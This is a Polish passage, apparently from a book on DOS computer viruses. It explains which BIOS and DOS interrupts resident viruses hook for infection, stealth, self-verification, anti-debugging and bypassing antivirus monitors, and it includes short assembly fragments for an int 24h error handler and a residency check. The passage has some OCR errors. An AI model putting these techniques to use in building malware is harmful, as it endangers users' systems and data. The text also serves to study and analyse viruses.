\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 08h - Przerwanie sprz\uc1\u281\'eatowe IRQ 0 - standardowo zg\uc1\u322\'b3aszane 18 razy na sekund\uc1\u281\'ea przez uk\uc1\u322\'b3ad zegara 8253/8254 (cz\uc1\u281\'eastotliwo\uc1\u347\'9c\uc1\u263\'e6 generowania tego przerwania mo\uc1\u380\'bfna zmieni\uc1\u263\'e6 programowo). Wewn\uc1\u261\'b9trz procedury jego obs\uc1\u322\'b3ugi znajduje si\uc1\u281\'ea rozkaz wywo\uc1\u322\'b3ania przerwania 1Ch. Najcz\uc1\u281\'ea\uc1\u347\'9cciej u\uc1\u380\'bfywane jest ono do realizacji efekt\'f3w specjalnych, rzad}{\f1\fs24\lang1045{\*\listtag0}ziej do autoweryfikacji wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 09h - Przerwanie sprz\uc1\u281\'eatowe IRQ l, wywo\uc1\u322\'b3ywane po naci\uc1\u347\'9cni\uc1\u281\'eaciu lub puszczeniu klawisza na klawiaturze. Odczytany z portu 60h klawisz jest dekodowany przez funkcj\uc1\u281\'ea (4F/15), a nast\uc1\u281\'eapnie umieszczany w buforze klawiatury, sk\uc1\u261\'b9d dost\uc1\u281\'eapny jest p\'f3\uc1\u378\'9fniej dla funkcji przerwania 16h. Podobnie Jak IRQ O, przerwanie 09h u\uc1\u380\'bfywane jest zwykle do efekt\'f3w specjalnych i czasem do autoweryfikacji (na przyk\uc1\u322\'b3ad kod wirusa jest sprawdzany przy ka\uc1\u380\'bfdym naci\uc1\u347\'9cni\uc1\u281\'eaciu lub puszczeniu klawisza).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 10h - Przer}{\f0\fs24\lang1045{\*\listtag0}wanie programowe BIOS obs\uc1\u322\'b3uguj\uc1\u261\'b9ce funkcje ekranu;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch u\uc1\u380\'bfywane do efekt\'f3w specjalnych lub w celu informowania innych kopii wirusa o obecno\uc1\u347\'9cci w pami\uc1\u281\'eaci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 12h - Przerwanie programowe BIOS zwracaj\uc1\u261\'b9ce po wywo\uc1\u322\'b3aniu wielko\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci operacyjnej podan\uc1\u261\'b9 w kilobajtach. Zwracana warto\uc1\u347\'9c\uc1\u263\'e6 jest odczytywana ze zmiennej systemowej BIOS, znajduj\uc1\u261\'b9cej si\uc1\u281\'ea pod adresem 0000:0413. Przerwanie to wykorzystuj\uc1\u261\'b9 g\uc1\u322\'b3\'f3wnie wirusy tablicy partycji i BOOT-sektor\'f3w, gdy zmniejszaj\uc1\u261\'b9 ilo\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci dost\uc1\u281\'eapnej dla systemu DOS. Aby tego dokona\uc1\u263\'e6, }{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ie musz\uc1\u261\'b9 jednak przejmowa\uc1\u263\'e6 przerwania, a tylko zmodyfikowa\uc1\u263\'e6 wy\uc1\u380\'bfej wymienion\uc1\u261\'b9 zmienn\uc1\u261\'b9 BIOS. Czasem przerwanie 12h przejmowane jest w celu informowania innych kopii wirusa o obecno\uc1\u347\'9cci w systemie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 13h - Przerwanie programowe BIOS odpowiedzialne za obs\uc1\u322\'b3ug\uc1\u281\'ea dysk\'f3w na poziomie sektor\'f3w. Obs\uc1\u322\'b3uguj\uc1\u261\'b9c dyskietki wywo\uc1\u322\'b3uje przerwanie 40h. Jest ono u\uc1\u380\'bfywane najcz\uc1\u281\'ea\uc1\u347\'9cciej podczas infekcji}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch przez wirusy atakuj\uc1\u261\'b9ce G\uc1\u322\'b3\'f3wny Rekord \uc1\u321\'a3aduj\uc1\u261\'b9cy (MBR), BOOT-sektory i JAP. Jego przej\uc1\u281\'eacie umo\uc1\u380\'bfliwia zastosowanie techniki stealth dla sektor\'f3w, a tak\uc1\u380\'bfe informowanie innych kopii wirusa o obecno\uc1\u347\'9cci w systemie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 14h - Przerwanie programowe BIOS odpowiedzialne za obs\uc1\u322\'b3ug\uc1\u281\'ea \uc1\u322\'b3\uc1\u261\'b9czy szeregowych. Przechwytywane (cho\uc1\u263\'e6 rzadko) dla efekt\'f3w specjalnych, polegaj\uc1\u261\'b9cych na przek\uc1\u322\'b3amywaniu odczyt\'f3w7 i zapis\'f3w z\uc1\u322\'b3\uc1\u261\'b9cza.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 15h - Przerwanie programowe BIOS odpowiedzialne za dodatkowe funkcje systemowe. Mo\uc1\u380\'bfe by\uc1\u263\'e6 przejmowane dla efekt\'f3w specjalnych, polegaj\uc1\u261\'b9cych na zmianie obs\uc1\u322\'b3ugi funkcji 4Fh. Powy\uc1\u380\'bfsza funkcja jest wywo\uc1\u322\'b3ywana przez przerwanie sprz\uc1\u281\'eatowe IRQ l (09h) i odpowiada za dekodowanie klawiszy do postaci widzianej p\'f3\uc1\u378\'9fniej przez przerwanie programowe int 16h. Godna uwagi jest tak\uc1\u380\'bfe funkcja (9000/15), wywo\uc1\u322\'b3ywana przez procedur\uc1\u281\'ea obs\uc1\u322\'b3ugi przerwania sprz\uc1\u281\'eatowego IRQ 14 (76h), kt\'f3rej przej\uc1\u281\'eacie umo\uc1\u380\'bfliwia zastosowanie te}{\f1\fs24\lang1045{\*\listtag0}chniki hardware-level stealth.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 16h - Przerwanie programowe BIOS odpowiedzialne za obs\uc1\u322\'b3ug\uc1\u281\'ea klawiatury. Przejmowane najcz\uc1\u281\'ea\uc1\u347\'9cciej dla efekt\'f3w specjalnych lub w celu informowania innych kopii wirusa o obecno\uc1\u347\'9cci w pami\uc1\u281\'eaci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 17h - Przerwanie programowe BIOS obs}{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3uguj\uc1\u261\'b9ce drukarki. Przejmowane (cho\uc1\u263\'e6 rzadko) dla efekt\'f3w specjalnych, polegaj\uc1\u261\'b9cych np. na fa\uc1\u322\'b3szowaniu drukowanych znak\'f3w.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 1Ch - Przerwanie wywo\uc1\u322\'b3ywane przez przerwanie sprz\uc1\u281\'eatowe IRQ 0 (08h), najcz\uc1\u281\'ea\uc1\u347\'9cciej przejmowane do cel\'f3w efekt\'f3w specjalnych (cho\uc1\u263\'e6 w tym wypadku lepiej przej\uc1\u261\'b9\uc1\u263\'e6 obs\uc1\u322\'b3ug\uc1\u281\'ea przerwania IRQ 0).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 21h - Przerwanie programowe DOS odpowiedzialne m.in. za obs\uc1\u322\'b3ug\uc1\u281\'ea dysk\'f3w logicznych na poziomie plik\'f3w, a tak\uc1\u380\'bfe pami\uc1\u281\'eaci operacyjnej, czyli newralgicznych cz\uc1\u281\'ea\uc1\u347\'9cci systemu, st\uc1\u261\'b9d te\uc1\u380\'bf jest ono najcz\uc1\u281\'ea\uc1\u347\'9cciej przejmowanym przez wirusy przerwaniem. Umo\uc1\u380\'bfliwia infekcj\uc1\u281\'ea plik\'f3w przy ich otwieraniu, zamykaniu, czytaniu, zmianie nazwy, uruchamianiu itd. oraz pozwala na ukrywanie si\uc1\u281\'ea w systemie. Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf jest potrzebne wirusom do mno\uc1\u380\'bfenia si\uc1\u281\'ea, nie wykorzystywan}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} przez system numery funkcji cz\uc1\u281\'easto s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9 innym kopiom wirusa do sprawdzania jego}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch obecno\uc1\u347\'9cci w systemie (nie musi on ju\uc1\u380\'bf przejmowa\uc1\u263\'e6 innego przerwania, gdy\uc1\u380\'bf wy\uc1\u380\'bfej wymieniona operacja wykonywana jest niejako przy okazji).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 24h - Przerwanie programowe DOS obs}{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3uguj\uc1\u261\'b9ce b\uc1\u322\'b3\uc1\u281\'eady krytyczne systemu. W wypadku wyst\uc1\u261\'b9pienia b\uc1\u322\'b3\uc1\u281\'eadu wywo\uc1\u322\'b3uje ono standardowo tzw. dialog ARIF (skr\'f3t od ang. Abort Retry Ignore Fail), pozwalaj\uc1\u261\'b9cy u\uc1\u380\'bfytkownikowi zadecydowa\uc1\u263\'e6, jak\uc1\u261\'b9 podj\uc1\u261\'b9\uc1\u263\'e6 operacj\uc1\u281\'ea. Przerwanie to wirusy przejmuj\uc1\u261\'b9 na czas infekcji, }{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}by w razie wyst\uc1\u261\'b9pienia jakiego\uc1\u347\'9c b\uc1\u322\'b3\uc1\u281\'eadu wirus m\'f3g\uc1\u322\'b3 sam zadecydowa\uc1\u263\'e6, jak\uc1\u261\'b9 akcj\uc1\u281\'ea chce podj\uc1\u261\'b9\uc1\u263\'e6. Nowa obs\uc1\u322\'b3uga przerwania najcz\uc1\u281\'ea\uc1\u347\'9cciej zawiera dwie instrukcje nakazuj\uc1\u261\'b9ce systemowi DOS sygnalizowa\uc1\u263\'e6 b\uc1\u322\'b3\uc1\u261\'b9d programowi wywo\uc1\u322\'b3uj\uc1\u261\'b9cemu (czyli wirusowi). Wygl\uc1\u261\'b9daj\uc1\u261\'b9 one nast\uc1\u281\'eap}{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}j\uc1\u261\'b9co:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Typowa procedura obs\uc1\u322\'b3ugi przerwania int 24h u\uc1\u380\'bfywana podczas infekcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   AL,3                ; sygnalizuj b\uc1\u322\'b3\uc1\u261\'b9d programowi (czyli wirusowi)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IRET                      ; powr\'f3t 2 obs\uc1\u322\'b3ugi przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 25h - Przerwanie programowe DOS odpowiedzialne za o}{\f0\fs24\lang1045{\*\listtag0}dczyt sektor\'f3w z dysk\'f3w logicznych, czasem u\uc1\u380\'bfywane do ukrywania si\uc1\u281\'ea w systemie, ale g\uc1\u322\'b3\'f3wnie do \uc1\u322\'b3atwego odczytywania BOOT-se-ktor\'f3w.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 26h - Przerwanie programowe DOS odpowiedzialne za zapis sektor\'f3w na dyskach logicznych. Najcz\uc1\u281\'ea\uc1\u347\'9cciej u\uc1\u380\'bfywane jest do infekcji BOOT-sektor\'f3w. Zwykle wykorzystuj \uc1\u261\'b9 je konie troja\uc1\u324\'f1skie do destrukcji.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 27h - Przerwanie programowe DOS. Umo\uc1\u380\'bfliwia zako\uc1\u324\'f1czenie programu z pozostawieniem kodu w pami\uc1\u281\'eaci. U\uc1\u380\'bfywaj\uc1\u261\'b9 go niekt\'f3re, zw\uc1\u322\'b3aszcza stare, programy TSR, nowsze korzystaj\uc1\u261\'b9 z funkcji (31/21). Wykorzystuj\uc1\u261\'b9c dzia\uc1\u322\'b3anie tego przerwania lub funkcji (31/21) mo\uc1\u380\'bfna napisa\uc1\u263\'e6 prostego wirusa rezydentnego.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 28h - Przerwanie programowe DOS pozwalaj\uc1\u261\'b9ce na wykonywanie pewnych operacji w tle, co jest wykorzystywane m. in. przez program PRINT. Mo\uc1\u380\'bfe by\uc1\u263\'e6 u\uc1\u380\'bfyteczne do infekowania plik\'f3w, gdy DOS nie jest zaj\uc1\u281\'eaty \uc1\u380\'bfadnym zadaniem, tak jak robi to np. wirus DOS-IDLE.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 2Fh - Przerwanie multipleksowane systemu. Ze wzgl\uc1\u281\'eadu na r\'f3\uc1\u380\'bfnorodno\uc1\u347\'9c\uc1\u263\'e6 wykonywanych funkcji umo\uc1\u380\'bfliwia m. in. znajdowanie oryginalnej procedury przerwania 13h (13h/2F), informowanie innych kopii wirusa o obecno\uc1\u347\'9cci w systemie oraz infekcj\uc1\u281\'ea plik\'f3w przy ich zamykaniu. To ostatnie mo\uc1\u380\'bfliwe jest dzi\uc1\u281\'eaki zastosowaniu funkcji (1216/1220/2F), operuj\uc1\u261\'b9cych na systemowych tablicach SFT (ang. System File Table), w}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}kt\'f3rych zawarte s\uc1\u261\'b9 wszystkie parametry wskazywanego przez uchwyt pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 30h/31h - W tablicy przerwa\uc1\u324\'f1, w miejscu, gdzie powinny by\uc1\u263\'e6 adresy obs\uc1\u322\'b3ugi tych przerwa\uc1\u324\'f1 znajduje si\uc1\u281\'ea rozkaz dalekiego skoku do DOS w postaci 0EA 00 00 SS SS, gdzie OO OO to ofset, a SS SS to segment (po starcie systemu jest to segment kodu systemu DOS, ale mo\uc1\u380\'bfe by\uc1\u263\'e6 podmieniony przez program antywirusowy). Adres wskazywany przez rozkaz skoku mo\uc1\u380\'bfe by\uc1\u263\'e6 wykorzystywany do wywo\uc1\u322\'b3ywania funkcji DOS wed\uc1\u322\'b3ug przestarza\uc1\u322\'b3ej konwencji CP/M, a tak\uc1\u380\'bf}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} do zlokalizowania w segmencie kodu DOS adresu obs\uc1\u322\'b3ugi przerwania 21h, co umo\uc1\u380\'bfliwia bezpieczne, omijaj\uc1\u261\'b9ce wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 monitor\'f3w antywirusowych, wywo\uc1\u322\'b3ywanie funkcji DOS (metod\uc1\u281\'ea t\uc1\u281\'ea stosuje m.in. wirus DIR-2).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 40h - Przerwanie programowe BIOS, kt\'f3re obs\uc1\u322\'b3uguje dyski elastyczne. W wi\uc1\u281\'eakszo\uc1\u347\'9cci BIOS-\'f3w adres tego przerwania jest oryginalnym adresem przerwania 13h podczas inicjacji systemu. Podczas startu systemu BIOS przekierowywuje przerwanie 13h na 40h, o ile wykryje dysk twardy. Rzadko przejmowane; umo\uc1\u380\'bfliwia do}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}t\uc1\u281\'eap do dyskietek z pomini\uc1\u281\'eaciem przerwania 13h.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 76h - Przerwanie sprz\uc1\u281\'eatowe IRQ 14, generowane przez sterownik dysku twardego przy wszelkich operacjach dyskowych. Obs\uc1\u322\'b3uga przerwania polega na wykonaniu odczytu z portu 1F7h (rejestr stanu IDE) i wywo\uc1\u322\'b3aniu funkcji (9000/15). Przej\uc1\u281\'eacie jego lub funkcji (9000/15) umo\uc1\u380\'bfliwia zastosowanie techniki hardware-level stealth do ukrywania si\uc1\u281\'ea w systemie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak wida\uc1\u263\'e6, jest to znakomita wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wszystkich wykorzystywanych przez programy przerwa\uc1\u324\'f1. Czasem, w celu zminimalizowania rozmiar\'f3w, wirus przejmuje dodatkowo jakie\uc1\u347\'9c nie u\uc1\u380\'bfywane przez system przerwanie (najcz\uc1\u281\'ea\uc1\u347\'9cciej powy\uc1\u380\'bfej numeru 60h), aby przy jego pomocy wywo\uc1\u322\'b3ywa\uc1\u263\'e6 pierwotny program obs\uc1\u322\'b3ugi jakiego\uc1\u347\'9c przej\uc1\u281\'eatego przez siebie przerwania. Korzysta z tego, \uc1\u380\'bfe maszynowy ro}{\f1\fs24\lang1045{\*\listtag0}zkaz wy-}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch wo\uc1\u322\'b3ania przerwania (INT ??) zawiera tylko 2 bajty (o kodach OCDh/??, gdzie ?? to numer przerwania), gdy tymczasem rozkaz wywo\uc1\u322\'b3ania pierwotnego programu obs\uc1\u322\'b3ugi za pomoc\uc1\u261\'b9 rozkazu wywo\uc1\u322\'b3ania procedury zajmowa\uc1\u322\'b3by od 3 (wywo\uc1\u322\'b3anie po\uc1\u347\'9credniej, bliskiej procedury) do 6 bajt\'f3w (wywo\uc1\u322\'b3anie dalekiej, bezpo\uc1\u347\'9credniej procedury). Przej\uc1\u281\'eacie jakiego\uc1\u347\'9c przerwania programowego mo\uc1\u380\'bfe by\uc1\u263\'e6 tak\uc1\u380\'bfe wykorzystywane do sprawdzania, czy wirus zosta\uc1\u322\'b3 ju\uc1\u380\'bf wcze\uc1\u347\'9cniej zainstalowany w pami\uc1\u281\'eaci, co pozwala mu unikn\uc1\u261\'b9\uc1\u263\'e6 powt\'f3rnej, niepotrze}{\f1\fs24\lang1045{\*\listtag0}b}{\f0\fs24\lang1045{\*\listtag0}nej instalacji. Sekwencja wykrywaj\uc1\u261\'b9ca, czy wirus jest ju\uc1\u380\'bf zainstalowany, ma najcz\uc1\u281\'ea\uc1\u347\'9cciej posta\uc1\u263\'e6:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV   AX.HAS\uc1\u321\'a3O            ; najcz\uc1\u281\'ea\uc1\u347\'9cciej w AX podaje si\uc1\u281\'ea jak\uc1\u261\'b9\uc1\u347\'9c nie typow\uc1\u261\'b9 funkcj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT   xx                  ; xx - numer przerwania (najcz\uc1\u281\'ea\uc1\u347\'9cciej 21h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP   REJ,ODPOWIED\uc1\u377\'8f       ; czy wirus ju\uc1\u380\'bf zainstalowany (rej - najcz\uc1\u281\'ea\uc1\u347\'9cciej AX) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JE Ju\uc1\u380\'bfZainstalowany       ; skok, gdy zainstalowany wirus zwr\'f3ci\uc1\u322\'b3 odpowied\uc1\u378\'9f}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ...........               ; zainstaluj si\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ju\uc1\u380\'bfZainstalowany:         ; powr\'f3\uc1\u263\'e6 do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wiedza o najcz\uc1\u281\'ea\uc1\u347\'9cciej przejmowanych przerwaniach pozwala cz\uc1\u281\'easto na r\uc1\u281\'eaczne przej\uc1\u347\'9ccie przez \uc1\u322\'b3a\uc1\u324\'f1cuch obs\uc1\u322\'b3ugi przerwania przy u\uc1\u380\'bfyciu de-buggera i sprawdzenie po drodze, czy nie ma gdzie\uc1\u347\'9c kodu budz\uc1\u261\'b9cego podejrzenia, prawdopodobnie nale\uc1\u380\'bf\uc1\u261\'b9cego do wirusa. Przy takim sprawdzaniu nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6 o kilku niebezpiecze\uc1\u324\'f1stwach zwi\uc1\u261\'b9zanych z u\uc1\u380\'bfywaniem debuggera w systemie kontrolowanym przez wirusa. Wirus mo\uc1\u380\'bfe kontrolowa\uc1\u263\'e6 funkcj\uc1\u281\'ea (4B01/21), s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9c\uc1\u261\'b9 debugge-rom do \uc1\u322\'b3adowania program\'f3w. Je\uc1\u380\'bfeli jest ona wywo\uc1\u322\'b3ywana, wirus mo\uc1\u380\'bfe si\uc1\u281\'ea deinstalowa\uc1\u263\'e6 z }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}ami\uc1\u281\'eaci lub podj\uc1\u261\'b9\uc1\u263\'e6 jakie\uc1\u347\'9c inne dzia\uc1\u322\'b3anie, maskuj\uc1\u261\'b9ce lub destrukcyjne. Podobne niebezpiecze\uc1\u324\'f1stwo grozi ciekawskiemu u\uc1\u380\'bfytkownikowi ze strony niekt\'f3rych, najcz\uc1\u281\'ea\uc1\u347\'9cciej destrukcyjnych wirus\'f3w, kontroluj\uc1\u261\'b9cych stan przerwania INT 01h i INT 03h, a te, jak wiadomo, }{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}\uc1\u380\'bfywane s\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej przez programy uruchomieniowe. Zwykle po wykryciu, i\uc1\u380\'bf adres procedury obs\uc1\u322\'b3ugi kt\'f3rego\uc1\u347\'9c z tych przerwa\uc1\u324\'f1 nie wskazuje na rozkaz IRET (czyli na pust\uc1\u261\'b9 procedur\uc1\u281\'ea obs\uc1\u322\'b3ugi przerwania), wirus b\uc1\u261\'b9d\uc1\u378\'9f blokuje komputer, b\uc1\u261\'b9d\uc1\u378\'9f brutalnie niszczy dan}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} na dysku twardym. Jeszcze inne niebezpiecze\uc1\u324\'f1stwo}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mo\uc1\u380\'bfe grozi\uc1\u263\'e6 u\uc1\u380\'bfytkownikowi ze strony wirus\'f3w, kt\'f3re potrafi\uc1\u261\'b9 sprawdza\uc1\u263\'e6 poprawno\uc1\u347\'9c\uc1\u263\'e6 swego kodu. Procedura autoweryfikacji mo\uc1\u380\'bfe by\uc1\u263\'e6 wywo\uc1\u322\'b3ywana przez ka\uc1\u380\'bfde z niewinnych przerwa\uc1\u324\'f1 programowych, u\uc1\u380\'bfywanych powszechnie w oprogramowaniu (np.: 10h, 16h) lub te\uc1\u380\'bf mo\uc1\u380\'bfe by\uc1\u263\'e6 podczepiona pod kt\'f3re\uc1\u347\'9c z przerwa\uc1\u324\'f1 sprz\uc1\u281\'eatowych. W przypadku wykrycia jakich\uc1\u347\'9c zmian (np, z\uc1\u322\'b3y wynik obliczanej na bie\uc1\u380\'bf\uc1\u261\'b9co sumy korekcyjnej) wirus mo\uc1\u380\'bfe natychmiast podj\uc1\u261\'b9\uc1\u263\'e6 niemile dla u\uc1\u380\'bfytkownika dzia\uc1\u322\'b3anie o}{\f1\fs24\lang1045{\*\listtag0}dwetowe.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na koniec warto jeszcze wspomnie\uc1\u263\'e6, i\uc1\u380\'bf zamiast przerwa\uc1\u324\'f1 niekt\'f3re wirusy rezydentne przejmuj\uc1\u261\'b9 obs\uc1\u322\'b3ug\uc1\u281\'ea sterownik\'f3w urz\uc1\u261\'b9dze\uc1\u324\'f1 blokowych, zajmuj\uc1\u261\'b9cych si\uc1\u281\'ea operacjami na urz\uc1\u261\'b9dzeniach masowych, takich jak dysk twardy czy dyskietka, w spos\'f3b analogiczny do program\'f3w umieszczanych w plikach SYS. Pozwala im to monitorowa\uc1\u263\'e6 odwo\uc1\u322\'b3ania do dysk\'f3w logicznych, zainstalowanych w systemie na poziomie po\uc1\u347\'9crednim mi\uc1\u281\'eadzy systemem DOS i BIOS (jest to potrzebne np. przy infekcji polegaj\uc1\u261\'b9cej na podmianie pierwszej JAP pliku).}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}Tak przej\uc1\u281\'eate odwo\uc1\u322\'b3anie do systemu b\uc1\u281\'eadzie do\uc1\u347\'9c\uc1\u263\'e6 trudne do wykrycia poprzez r\uc1\u281\'eaczne analizowanie kodu jakiego\uc1\u347\'9c przerwania krok po kroku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.2. Wykorzystanie funkcji DOS}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najpro\uc1\u347\'9cciej przej\uc1\u261\'b9\uc1\u263\'e6 obs\uc1\u322\'b3ug\uc1\u281\'ea przerwania u\uc1\u380\'bfywaj\uc1\u261\'b9c dw\'f3ch przeznaczonych do tego celu funkcji DOS, tzn. (25/35/21) za pomoc\uc1\u261\'b9 poni\uc1\u380\'bfszej sekwencji w asemblerze:}{\f0\fs24\lang1045{\*\listtag0}\par}
